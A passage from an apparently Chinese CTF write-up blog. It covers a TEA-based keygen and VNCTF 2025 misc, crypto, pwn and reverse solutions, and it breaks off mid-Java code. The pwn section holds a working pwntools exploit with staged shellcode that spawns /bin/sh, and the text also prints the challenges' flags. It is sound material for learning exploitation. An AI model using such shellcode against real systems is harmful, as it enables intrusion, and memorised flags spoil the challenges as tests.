class="number">12</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        sum += delta;</span><br><span class="line">        v1 += ((v0 &lt;&lt; <span class="number">4</span>) + k[<span class="number">2</span>]) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>]);</span><br><span class="line">        v0 += ((v1 &lt;&lt; <span class="number">4</span>) + k[<span class="number">0</span>]) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输入格式：</span></span><br><span class="line"><span class="comment">flag</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">tea_enc</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">    timestamp 8字节</span></span><br><span class="line"><span class="comment">    uid 8字节</span></span><br><span class="line"><span class="comment">    md5 4字节</span></span><br><span class="line"><span class="comment">    0x04*4 4字节填充</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 动调得到的三个Key</span></span><br><span class="line">    <span class="type">uint32_t</span> key1[] =</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0xD7851B65</span>,</span><br><span class="line">        <span class="number">0x473457C1</span>,</span><br><span class="line">        <span class="number">0x1231F787</span>,</span><br><span class="line">        <span class="number">0x9ACD6D9A</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">uint32_t</span> key2[] =</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0xB728E994</span>,</span><br><span class="line">        <span class="number">0x1746382E</span>,</span><br><span class="line">        <span class="number">0xC52D865C</span>,</span><br><span class="line">        <span class="number">0x10778A6E</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">uint32_t</span> key3[] =</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0x7459F437</span>,</span><br><span class="line">        <span class="number">0x90D1E5D</span>,</span><br><span class="line">        <span class="number">0x779375B2</span>,</span><br><span class="line">        <span class="number">0xEFCB8541</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> timestamp_bytes[<span class="number">8</span>]&#123;&#125;;</span><br><span class="line">    <span class="comment">// 8字节下的UID</span></span><br><span class="line">    <span class="type">uint8_t</span> uid[]&#123; <span class="number">0x50</span>, <span class="number">0x04</span>, <span class="number">0x23</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span> &#125;;</span><br><span class="line">    <span class="comment">// 动调得到MD5四个字节，加上最后4个0x04填充</span></span><br><span class="line">    <span class="type">uint8_t</span> md5_and_pad[]&#123; <span class="number">0xD2</span>, <span class="number">0x63</span>, <span class="number">0xE4</span>, <span class="number">0xE6</span>, <span class="number">0x04</span>, <span class="number">0x04</span>, <span class="number">0x04</span>, <span class="number">0x04</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 半时整点时间戳计算</span></span><br><span class="line">    FILETIME time&#123;&#125;;</span><br><span class="line">    DWORD64 timestamp&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">GetSystemTimeAsFileTime</span>(&amp;time);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="type">void</span>*)(&amp;timestamp), (<span class="type">void</span>*)(&amp;time), <span class="number">8</span>);</span><br><span class="line">    timestamp = <span class="number">1800</span> * ((timestamp / <span class="number">0x989680</span> - <span class="number">0x2B6109100LL</span>) / <span class="number">0x708</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="type">void</span>*)(timestamp_bytes), (<span class="type">void</span>*)(&amp;timestamp), <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加密数据</span></span><br><span class="line">    <span class="built_in">tea_encrypt</span>((<span class="type">uint32_t</span>*)timestamp_bytes, (<span class="type">uint32_t</span>*)key1);</span><br><span class="line">    <span class="built_in">tea_encrypt</span>((<span class="type">uint32_t</span>*)uid, (<span class="type">uint32_t</span>*)key2);</span><br><span class="line">    <span class="built_in">tea_encrypt</span>((<span class="type">uint32_t</span>*)md5_and_pad, (<span class="type">uint32_t</span>*)key3);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flag&#123;&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>, timestamp_bytes[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>, uid[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>, md5_and_pad[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="心得"><a href="#心得" class="headerlink" title="心得"></a>心得</h1><p>动调调试分析程序主体流程很重要，要先了解大概执行框架才能逐步往下层分析，且上层一些代码条件有助于下层的分析。</p><p>然后踩了一个严重的坑就是IDA伪代码里面的变量值和实际值一些情况下是不一样的，之前写题没在意那么多，这次很多地方都发现有这种问题，卡了我分析好久。所以关键代码段最好用汇编逐步分析，看实际数据的变化。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;吾爱2025-Windows逆向高级题-5&quot;&gt;&lt;a href=&quot;#吾爱2025-Windows逆向高级题-5&quot; class=&quot;headerlink&quot; title=&quot;吾爱2025-Windows逆向高级题-5&quot;&gt;&lt;/a&gt;吾爱2025-Windows逆向高级题-5&lt;/</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>VNCTF2025</title>
    <link href="https://tkazer.github.io/2025/02/12/VNCTF2025/"/>
    <id>https://tkazer.github.io/2025/02/12/VNCTF2025/</id>
    <published>2025-02-12T14:53:27.000Z</published>
    <updated>2025-02-12T15:10:39.099Z</updated>
    
    <content type="html"><![CDATA[<h1 id="VNCTF-2025-WP"><a href="#VNCTF-2025-WP" class="headerlink" title="VNCTF 2025 WP"></a>VNCTF 2025 WP</h1><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="VN-Lang"><a href="#VN-Lang" class="headerlink" title="VN_Lang"></a>VN_Lang</h3><p>IDA分析VN_Lang_XXXX.exe字符串搜索VN得到Flag。</p><p><img src="/2025/02/12/VNCTF2025/vnlang.png" alt="vnlang"></p><h4 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h4><p><strong>VNCTF{i9UQEqFXgbJBI1LasSZmBxxXSNYFRyCkpydKvhZo7d9Ai}</strong></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="easymath"><a href="#easymath" class="headerlink" title="easymath"></a>easymath</h3><p>ai一把梭。</p><p>dec.sage:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> ZZ, PolynomialRing</span><br><span class="line"></span><br><span class="line">R = PolynomialRing(ZZ, <span class="string">&quot;x&quot;</span>)</span><br><span class="line">x = R.gen()</span><br><span class="line">polynomial = x**<span class="number">3</span> - <span class="number">15264966144147258587171776703005926730518438603688487721465</span>*x**<span class="number">2</span> + <span class="number">76513250180666948190254989703768338299723386154619468700730085586057638716434556720233473454400881002065319569292923</span>*x - <span class="number">125440939526343949494022113552414275560444252378483072729156599143746741258532431664938677330319449789665352104352620658550544887807433866999963624320909981994018431526620619</span></span><br><span class="line"></span><br><span class="line">roots = polynomial.roots()</span><br><span class="line">primes = [<span class="built_in">int</span>(r[<span class="number">0</span>]) <span class="keyword">for</span> r <span class="keyword">in</span> roots]</span><br><span class="line">N = primes[<span class="number">0</span>] * primes[<span class="number">1</span>] * primes[<span class="number">2</span>]</span><br><span class="line">c = <span class="number">24884251313604275189259571459005374365204772270250725590014651519125317134307160341658199551661333326703566996431067426138627332156507267671028553934664652787411834581708944</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">24884251313604275189259571459005374365204772270250725590014651519125317134307160341658199551661333326703566996431067426138627332156507267671028553934664652787411834581708944</span></span><br><span class="line"></span><br><span class="line">square_roots = []</span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> primes:</span><br><span class="line">    root = power_mod(c, (p + <span class="number">1</span>) // <span class="number">4</span>, p) </span><br><span class="line">    square_roots.append((root, p))</span><br><span class="line"></span><br><span class="line">possible_flags = []</span><br><span class="line"><span class="keyword">for</span> signs <span class="keyword">in</span> [(<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>), (<span class="number">1</span>, <span class="number">1</span>, -<span class="number">1</span>), (<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>), (-<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>), (-<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>), (-<span class="number">1</span>, <span class="number">1</span>, -<span class="number">1</span>), (<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>), (-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>)]:</span><br><span class="line">    crt_solution = crt([signs[i] * square_roots[i][<span class="number">0</span>] % primes[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)], primes)</span><br><span class="line">    possible_flags.append(crt_solution)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(possible_flags)</span><br><span class="line"><span class="comment">#[55745449774035533604132123837354458550470434042238203561240895515463850669082841278843372190705837595737691650856096087615682512159689935652128349720357413457859444632369350, 125115225001407144448151513636019415817956856295873219712252392836948941964102523530173092625214575404136789335483571504152920024161726170211008255272440379726560839152801102, 121308689781282565030341210716083690163638176623957028113928015415750030819041672272612041957024041097790808247093717003449846352538078398824952421335589115302596759718820027, 60203414044033723113683626590079903689763905879374101193373685550258360403003508805935592269106120673140798276984048897114005911074753100616094921754147882416738708813989459, 325714524936805045870599916394859742487396082609853016904206306797799294429908134765584705104874385528562768869049154397624863645707696788955369048469602267457592373819517, 4132249745061384463680902836330585396806075754526044615228583727996710439490759392326635373295408691874543857258903655100698535269355468175011202985320866691421671807800592, 65237525482310226380338486962334371870680346499108971535782913593488380855528922859003085061213329116524553827368571761436538976732680766383868702566762099577279722712631160, 69695489752308415889889989715059817009973818336244869167915703628282890589449590386095305139613612193927660453496524570934862375647743931347835274600552568536158986894251269]</span></span><br></pre></td></tr></table></figure><p>dec.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p =[<span class="number">55745449774035533604132123837354458550470434042238203561240895515463850669082841278843372190705837595737691650856096087615682512159689935652128349720357413457859444632369350</span>, <span class="number">125115225001407144448151513636019415817956856295873219712252392836948941964102523530173092625214575404136789335483571504152920024161726170211008255272440379726560839152801102</span>, <span class="number">121308689781282565030341210716083690163638176623957028113928015415750030819041672272612041957024041097790808247093717003449846352538078398824952421335589115302596759718820027</span>, <span class="number">60203414044033723113683626590079903689763905879374101193373685550258360403003508805935592269106120673140798276984048897114005911074753100616094921754147882416738708813989459</span>, <span class="number">325714524936805045870599916394859742487396082609853016904206306797799294429908134765584705104874385528562768869049154397624863645707696788955369048469602267457592373819517</span>, <span class="number">4132249745061384463680902836330585396806075754526044615228583727996710439490759392326635373295408691874543857258903655100698535269355468175011202985320866691421671807800592</span>, <span class="number">65237525482310226380338486962334371870680346499108971535782913593488380855528922859003085061213329116524553827368571761436538976732680766383868702566762099577279722712631160</span>, <span class="number">69695489752308415889889989715059817009973818336244869167915703628282890589449590386095305139613612193927660453496524570934862375647743931347835274600552568536158986894251269</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> p:</span><br><span class="line">    f_bytes = f.to_bytes((f.bit_length() + <span class="number">7</span>) // <span class="number">8</span>, byteorder=<span class="string">&quot;big&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> f_bytes.startswith(<span class="string">b&#x27;VNCTF&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(f_bytes.decode())</span><br><span class="line">        </span><br><span class="line"><span class="comment"># VNCTF&#123;90dcfb2dfb21a21e0c8715cbf3643f4a47d3e2e4b3f7b7975954e6d9701d9648&#125;</span></span><br></pre></td></tr></table></figure><h4 id="Flag-1"><a href="#Flag-1" class="headerlink" title="Flag"></a>Flag</h4><p><strong>VNCTF{90dcfb2dfb21a21e0c8715cbf3643f4a47d3e2e4b3f7b7975954e6d9701d9648}</strong></p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="签个到吧"><a href="#签个到吧" class="headerlink" title="签个到吧"></a>签个到吧</h3><p>checksec</p><p><img src="/2025/02/12/VNCTF2025/pwn2.png" alt="QQ_1739074297610"></p><p>IDA分析pwn程序</p><p><img src="/2025/02/12/VNCTF2025/pwn1.png" alt="QQ_1739073892530"></p><p>发现就给22字节大小，可以写一个标准最短shell，但是execute函数清空了寄存器。</p><p><img src="/2025/02/12/VNCTF2025/pwn3.png" alt="QQ_1739074388173"></p><p>所以可以通过一段shellcode再read一次更大的空间。</p><p>接下来用shellcode调用&#x2F;bin&#x2F;sh即可。</p><p>参考：<a href="https://v3rdant.cn/Pwn.The-Art-of-Shellcode/">Pwn.the-Art-of-Shellcode | V3rdant’s Blog</a></p><p>payload.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch= <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>) </span><br><span class="line"><span class="comment">#p = remote(&quot;node.vnteam.cn&quot;,...)</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    xchg rdi, rsi</span></span><br><span class="line"><span class="string">    mov edi, eax</span></span><br><span class="line"><span class="string">    add edx, 0x114</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;try to show your strength \n&#x27;</span>,shellcode)</span><br><span class="line"></span><br><span class="line">pay = <span class="string">b&#x27;0&#x27;</span>*<span class="number">13</span> + asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rsp, rsi</span></span><br><span class="line"><span class="string">    add rsp, 0x114</span></span><br><span class="line"><span class="string">    xor rsi, rsi</span></span><br><span class="line"><span class="string">    mul rsi</span></span><br><span class="line"><span class="string">    push r8</span></span><br><span class="line"><span class="string">    mov rcx, 0x68732f2f6e69622f</span></span><br><span class="line"><span class="string">    push rcx</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    mov al, 59</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(pay)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2025/02/12/VNCTF2025/pwn4.png" alt="QQ_1739075764118"></p><h4 id="Flag-2"><a href="#Flag-2" class="headerlink" title="Flag"></a>Flag</h4><p><strong>动态值</strong></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Fuko’s-starfish"><a href="#Fuko’s-starfish" class="headerlink" title="Fuko’s starfish"></a><strong>Fuko’s starfish</strong></h3><p>IDA分析.exe程序发现最终游戏调用的是starfish.dll里面的函数，程序本身似乎没有与flag相关数据。</p><p><img src="/2025/02/12/VNCTF2025/fuko1.png" alt="QQ_1739075923934"></p><p>IDA分析.dll程序的play_snake函数，发现输出”u win”下面分支调用了一个Check函数（改名后的），Check函数有花指令，直接将图2红框部分nop即可F5分析。</p><p><img src="/2025/02/12/VNCTF2025/fuko2.png" alt="QQ_1739076003936"></p><p><img src="/2025/02/12/VNCTF2025/fuko7.png" alt="QQ_1739076991040"></p><p>可以看到函数内部就是主体流程，要解密一段字符串输出然后要求输入，加密最后与被加密的flag进行对比。</p><p><img src="/2025/02/12/VNCTF2025/fuko3.png" alt="QQ_1739076094303"></p><p>输入32长度字符串，被分为16字节为一个单位进行加密，进入加密函数发现有调试器检测，让数据走不同分支处理，直接将下图红框部分nop进行pass，然后将jz改成jmp即可（手动重新算一下相对偏移就行）。</p><p><img src="/2025/02/12/VNCTF2025/fuko11.png" alt="QQ_1739077386431"></p><p><img src="/2025/02/12/VNCTF2025/fuko8.png" alt="QQ_1739077338900"></p><p>可以通过算法特征识别出这是一个标准AES加密，没看出魔改的地方，但是密钥是从全局数据获取再经过一通计算拿的，计算过程不好看，考虑用动调获取，并且图1部分用密钥与输入进来的Input进行了异或，可以通过Input和这段数据进行异或获取到密钥。</p><p><img src="/2025/02/12/VNCTF2025/fuko4.png" alt="QQ_1739076342223"></p><p><img src="/2025/02/12/VNCTF2025/fuko5.png" alt="QQ_1739076365537"></p><p>看到DllMain似乎有反调试，但是似乎只扫描了进程，而且没检测ida，所以就不管了。</p><p><img src="/2025/02/12/VNCTF2025/fuko6.png" alt="QQ_1739076850485"></p><p>直接写一个程序来加载这个dll来call Check函数，便于调试。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">auto</span> hLib = <span class="built_in">LoadLibraryW</span>(<span class="string">L&quot;starfish.dll&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (hLib)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">auto</span> Addr = (DWORD64)hLib + <span class="number">0x25F0</span>;</span><br><span class="line"><span class="built_in">void</span> (*funcPtr)() = <span class="built_in">reinterpret_cast</span>&lt;<span class="built_in">void</span>(*)()&gt;(Addr);</span><br><span class="line"><span class="built_in">funcPtr</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入”1111111111111111”然后动调断点在下图断点，取出所有异或后的值，然后重新与输入字符再次异或拿到Key.</p><p><img src="/2025/02/12/VNCTF2025/fuko9.png" alt="QQ_1739077545772"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">uint8_t</span> Input[] = <span class="string">&quot;1111111111111111&quot;</span>;</span><br><span class="line">    <span class="type">uint8_t</span> c[]&#123; <span class="number">0x38</span>,<span class="number">0xd4</span>,<span class="number">0xCC</span>,<span class="number">0xDA</span>,<span class="number">0x59</span>,<span class="number">0x00</span>,<span class="number">0x44</span>,<span class="number">0x87</span>,<span class="number">0x80</span>,<span class="number">0x0A</span>,<span class="number">0xB5</span>,<span class="number">0x39</span>,<span class="number">0xA0</span>,<span class="number">0xDA</span>,<span class="number">0x49</span>,<span class="number">0xE3</span> &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, Input[i] ^ c[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Key</span></span><br><span class="line"><span class="comment">// 09 E5 FD EB 68 31 75 B6 B1 3B 84 08 91 EB 78 D2</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再用cyberchef AES解密得到Flag.</p><p><img src="/2025/02/12/VNCTF2025/fuko10.png" alt="QQ_1739077689242"></p><h4 id="Flag-3"><a href="#Flag-3" class="headerlink" title="Flag"></a>Flag</h4><p><strong>VNCTF{W0w_u_g0t_Fuk0’s_st4rf1sh}</strong></p><h3 id="Hook-Fish"><a href="#Hook-Fish" class="headerlink" title="Hook Fish"></a>Hook Fish</h3><p>jadx分析APK, 发现他会下载一个hook_fish.dex文件, 然后调用里面的check、encode、decode函数。但是他又会delete文件，所以得动调断点在这边然后手动去复制一份文件。</p><p><img src="/2025/02/12/VNCTF2025/fish1.png" alt="QQ_1739078061506"></p><p><img src="/2025/02/12/VNCTF2025/fish2.png" alt="QQ_1739078112517"></p><p>在delete前断点，启动调试，然后输入点击按钮断下，在文件夹中搜到hook_fish.dex复制到windows。</p><p><img src="/2025/02/12/VNCTF2025/fish3.png" alt="QQ_1739078448944"></p><p><img src="/2025/02/12/VNCTF2025/fish4.png" alt="QQ_1739078521968"></p><p>jadx分析hook_fish.dex可以发现有以下几个函数，以及一个被加密的flag。</p><p><img src="/2025/02/12/VNCTF2025/fish5.png" alt="QQ_1739078659633"></p><p>使用decode函数即可解密第一层，第二层解密就是用apk里面的encrypt进行写解密函数。</p><p><img src="/2025/02/12/VNCTF2025/fish6.png" alt="QQ_1739078766431"></p><p>这边发现加密后的1字节对2字节的，也就是从逐字节往后添加进行爆破，免得写解密函数了。</p><p>完整解密代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> HashMap&lt;String, Character&gt; fish_dcode;</span><br><span class="line">    <span class="keyword">private</span> HashMap&lt;Character, String&gt; fish_ecode;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">strr</span> <span class="operator">=</span> <span 